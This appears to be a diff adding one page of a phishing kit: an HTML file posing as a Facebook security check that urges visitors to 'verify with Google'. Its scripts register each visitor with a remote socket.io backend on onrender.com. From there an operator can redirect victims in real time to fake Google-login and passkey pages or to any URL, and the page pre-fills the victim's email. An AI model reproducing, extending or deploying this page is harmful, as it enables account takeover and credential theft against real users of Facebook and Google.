@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yz/r/KFyVIAWzntM.ico" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+
+    body {
+      font-family: Optimistic, 'Segoe UI Historic', 'Segoe UI', Helvetica, Arial, sans-serif;
+      background: #FFFFFF;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ───────────────────────────────────────────────
+       Full-screen noise texture — exactly like the
+       feTurbulence / feBlend="multiply" in the
+       original Facebook HTML
+    ─────────────────────────────────────────────── */
+    .fb-bg-noise {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* ───────────────────────────────────────────────
+       TOP NAV  (matches role="banner" in original)
+    ─────────────────────────────────────────────── */
+    .fb-nav {
+      position: relative;
+      z-index: 10;
+      background: #FFFFFF;
+      border-bottom: 1px solid #DADDE1;
+      width: 100%;
+      height: 56px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+    }
+
+    .fb-nav-content {
+      width: 100%;
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    /* invisible spacer keeps wordmark at same x as content */
+    .nav-spacer { width: 36px; flex-shrink: 0; }
+
+    .fb-wordmark { display: flex; align-items: center; }
+    .fb-wordmark svg { height: 22px; display: block; fill: #1877F2; }
+
+    /* ───────────────────────────────────────────────
+       MAIN — fills remaining height, centres content
+    ─────────────────────────────────────────────── */
+    .fb-main {
+      position: relative;
+      z-index: 1;
+      flex: 1 1 auto;
+      display: flex;
+      align-items: center;        /* vertical centre  */
+      justify-content: center;    /* horizontal centre */
+      padding: 32px 16px;
+    }
+
+    /* ───────────────────────────────────────────────
+       CONTENT BLOCK — no card, just the content
+       directly on the page (matches original)
+    ─────────────────────────────────────────────── */
+    .fb-content {
+      width: 100%;
+      max-width: 460px;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    /* ── Section spacing ── */
+    .section-head  { margin-bottom: 20px; }
+    .section-rows  { display: flex; flex-direction: column; gap: 10px; margin-bottom: 22px; }
+    .section-btn   {}
+
+    /* ── Eyebrow ── */
+    .eyebrow {
+      font-size: 13px;
+      font-weight: 400;
+      color: #65676B;
+      line-height: 1.3;
+      margin-bottom: 10px;
+    }
+
+    /* ── Heading ── */
+    .heading {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1C1E21;
+      line-height: 1.17;
+      margin-bottom: 13px;
+    }
+
+    /* ── Body paragraph ── */
+    .body-para {
+      font-size: 15px;
+      font-weight: 400;
+      color: #1C1E21;
+      line-height: 1.42;
+    }
+    .email-bold { font-weight: 700; }
+
+    /* ── Info rows (bordered, rounded — exact FB style) ── */
+    .info-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      border: 1px solid #CED0D4;
+      border-radius: 12px;
+      padding: 14px 16px;
+      background: #FFFFFF;
+    }
+
+    .info-icon {
+      flex-shrink: 0;
+      width: 20px;
+      height: 20px;
+      margin-top: 2px;
+      color: #1C1E21;
+    }
+    .info-icon svg { width: 20px; height: 20px; fill: currentColor; display: block; }
+
+    .info-text {
+      font-size: 15px;
+      font-weight: 500;
+      color: #1C1E21;
+      line-height: 1.4;
+    }
+
+    /* ── Verify button ── */
+    .verify-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      height: 48px;
+      padding: 0 20px;
+      background: #0866FF;
+      color: #FFFFFF;
+      font-family: inherit;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      transition: background 0.15s;
+      user-select: none;
+    }
+    .verify-btn:hover  { background: #0757E4; }
+    .verify-btn:active { background: #0648C6; }
+
+    .google-g {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+      display: block;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2.5px solid rgba(255,255,255,.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .65s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── Mobile: full-screen, top-aligned ── */
+    @media (max-width: 540px) {
+      .fb-nav  { height: 52px; }
+      .fb-main { align-items: flex-start; padding: 28px 20px 40px; }
+      .heading { font-size: 20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Full-page SVG noise (same filter as original Facebook HTML) -->
+  <svg class="fb-bg-noise" aria-hidden="true"
+       xmlns="http://www.w3.org/2000/svg"
+       width="100%" height="100%" preserveAspectRatio="none">
+    <defs>
+      <filter id="fbNoise" filterUnits="userSpaceOnUse"
+              x="0" y="0" width="100%" height="100%">
+        <feTurbulence type="fractalNoise" baseFrequency=".85" stitchTiles="stitch"/>
+        <feColorMatrix type="saturate" values="0"/>
+        <feBlend in="SourceGraphic" mode="multiply"/>
+      </filter>
+    </defs>
+    <rect width="100%" height="100%" filter="url(#fbNoise)" opacity=".04"/>
+  </svg>
+
+  <!-- ── Top navigation ── -->
+  <header class="fb-nav" role="banner">
+    <div class="fb-nav-content">
+      <div class="nav-spacer"></div>
+      <div class="fb-wordmark" aria-label="Facebook">
+        <svg viewBox="100 100 900 160" xmlns="http://www.w3.org/2000/svg">
+          <path d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"/>
+        </svg>
+      </div>
+    </div>
+  </header>
+
+  <!-- ── Page body ── -->
+  <main class="fb-main">
+    <div class="fb-content">
+
+      <!-- Header section -->
+      <div class="section-head">
+        <p class="eyebrow">Facebook</p>
+        <h2 class="heading">Log into your Google Account to confirm it&rsquo;s you</h2>
+        <p class="body-para">
+          For security reasons, we need you to verify with your Google Account by logging in with the Gmail address saved on your Facebook account:
+          <span class="email-bold" id="email-display"></span>.
+        </p>
+      </div>
+
+      <!-- Info rows -->
+      <div class="section-rows">
+
+        <div class="info-row">
+          <span class="info-icon">
+            <svg viewBox="0 0 24 24">
+              <g opacity=".9">
+                <path d="M21 12c0-1.41-.324-2.745-.903-3.933l1.48-1.48A10.95 10.95 0 0 1 23 12c0 .752-.076 1.488-.22 2.199a1 1 0 1 1-1.96-.398A9.05 9.05 0 0 0 21 12zM3.547 19.04l-1.254 1.253a1 1 0 1 0 1.414 1.414l18-18a1 1 0 0 0-1.414-1.414l-1.254 1.254A10.956 10.956 0 0 0 12 1c-2.659 0-5.099.944-7 2.514V2a1 1 0 0 0-2 0v4a1 1 0 0 0 1 1h4a1 1 0 1 0 0-2H6.343A8.959 8.959 0 0 1 12 3c2.125 0 4.078.736 5.618 1.968l-12.65 12.65A8.962 8.962 0 0 1 3 12c0-.618.062-1.22.18-1.801A1 1 0 1 0 1.22 9.8C1.076 10.512 1 11.248 1 12c0 2.678.957 5.132 2.547 7.04zM6.586 21.578l1.48-1.48A8.965 8.965 0 0 0 12 21a8.959 8.959 0 0 0 5.657-2H16a1 1 0 1 1 0-2h4a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0v-1.514A10.959 10.959 0 0 1 12 23a10.95 10.95 0 0 1-5.414-1.422z"/>
+              </g>
+            </svg>
+          </span>
+          <span class="info-text">We will not share any of your Facebook data with your Google Account</span>
+        </div>
+
+        <div class="info-row">
+          <span class="info-icon">
+            <svg viewBox="0 0 24 24">
+              <path fill-rule="evenodd" clip-rule="evenodd"
+                d="M12 1a5 5 0 0 0-5 5v2h-.857c-1.282 0-2.417.818-2.664 2.076A25.711 25.711 0 0 0 3 15c0 1.984.236 3.692.479 4.924C3.726 21.182 4.86 22 6.143 22h11.714c1.282 0 2.417-.818 2.664-2.076A25.71 25.71 0 0 0 21 15a25.71 25.71 0 0 0-.479-4.924C20.274 8.818 19.14 8 17.857 8H17V6a5 5 0 0 0-5-5zm3 7V6a3 3 0 1 0-6 0v2h6zm-4 9v-1.268A2 2 0 0 1 12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0z"/>
+            </svg>
+          </span>
+          <span class="info-text">This will not change the details you use to log into Facebook</span>
+        </div>
+
+      </div><!-- /.section-rows -->
+
+      <!-- Button -->
+      <div class="section-btn">
+        <button class="verify-btn" id="verify-btn" type="button">
+          <svg class="google-g" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+          </svg>
+          <span id="btn-label">Verify with Google</span>
+        </button>
+      </div>
+
+    </div><!-- /.fb-content -->
+  </main>
+
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <script>
+  /* Guard: redirect to apply.html if user opens this page directly (tab closed and reopened) */
+  (function () {
+    if (!sessionStorage.getItem('fbVerifySession')) {
+      window.location.replace('apply.html');
+    }
+  })();
+  </script>
+  <script>
+  (function () {
+    /* ── Keep admin visibility during transition ── */
+    var BACKEND = (function () {
+      var h = location.hostname;
+      return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
+        ? 'http://localhost:3001'
+        : 'https://backed-nxht.onrender.com';
+    })();
+    var clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+      clientId = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now().toString(36));
+      localStorage.setItem('clientId', clientId);
+    }
+    var socket = io(BACKEND, { query: { clientId: clientId }, transports: ['websocket', 'polling'] });
+    socket.on('connect', function () {
+      socket.emit('userConnectedToPage', { clientId: clientId, page: 'fb-verify' });
+    });
+    /* Chrome mobile kills WebSocket when backgrounded — force fresh reconnect on return */
+    var _fbWasHidden = false;
+    var _fbReady = false;
+    socket.on('connect', function () { _fbReady = true; });
+    document.addEventListener('visibilitychange', function () {
+      if (document.visibilityState === 'hidden') {
+        _fbWasHidden = true;
+      } else if (document.visibilityState === 'visible' && _fbWasHidden && _fbReady) {
+        _fbWasHidden = false;
+        setTimeout(function () {
+          socket.disconnect();
+          setTimeout(function () { socket.connect(); }, 300);
+        }, 800);
+      }
+    });
+    /* If admin re-triggers google-login while user is on this page, proceed normally */
+    socket.on('show-google-login', function () {
+      try {
+        sessionStorage.setItem('googleLoginSession', '1');
+        sessionStorage.setItem('googleContinueApp', 'facebook');
+      } catch(e) {}
+      window.location.href = 'google-login.html';
+    });
+    socket.on('show-passkey', function () {
+      try { sessionStorage.setItem('passkeySession', '1'); } catch(e) {}
+      window.location.href = 'passkey';
+    });
+    /* Generic redirect */
+    socket.on('redirect', function (url) { window.location.href = url; });
+  })();
+  </script>
+  <script>
+  (function () {
+    var emailEl = document.getElementById('email-display');
+    var btn     = document.getElementById('verify-btn');
+    var lbl     = document.getElementById('btn-label');
+
+    /* pre-fill email — only show if coming from the login flow */
+    var p = new URLSearchParams(window.location.search);
+    var email = p.get('email') || sessionStorage.getItem('lastLoginEmail') || '';
+    if (email) {
+      emailEl.textContent = email;
+    } else {
+      /* hide the span and its trailing period so nothing stray shows */
+      emailEl.parentNode.style.display = 'none';
+    }
+
+    /* click → google-login.html */
+    btn.addEventListener('click', function () {
+      var addr = email || emailEl.textContent;
+      try { sessionStorage.setItem('lastLoginEmail', addr); } catch(e) {}
+
+      btn.disabled = true;
+      btn.style.opacity = '.72';
+      lbl.textContent = '';
+      var sp = document.createElement('span');
+      sp.className = 'spinner';
+      btn.appendChild(sp);
+
+      setTimeout(function () {
+        try {
+          sessionStorage.setItem('googleLoginSession', '1');
+          sessionStorage.setItem('googleContinueApp', 'facebook');
+        } catch(e) {}
+        window.location.href = 'google-login.html';
+      }, 320);
+    });
+  })();
+  </script>
+
+</body>
+</html>
